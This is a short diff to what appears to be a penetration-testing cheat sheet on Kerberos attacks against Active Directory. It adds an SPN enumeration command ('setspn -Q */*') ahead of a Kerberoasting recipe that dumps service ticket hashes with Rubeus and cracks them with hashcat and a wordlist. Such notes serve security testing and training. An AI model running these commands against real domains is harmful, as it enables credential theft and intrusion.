@@ -113,6 +113,10 @@ TGT and TGS:
 
 >You need valid credentials inside the domain.
 ```
+Check all SPNs within the domain:
+setspn -Q */*
+```
+```
 .\Rubeus.exe kerberoast /outfile:hashes.kerberoast
 hashcat -a 0 -m 13100 hashes.kerberoast rockyou.txt
 
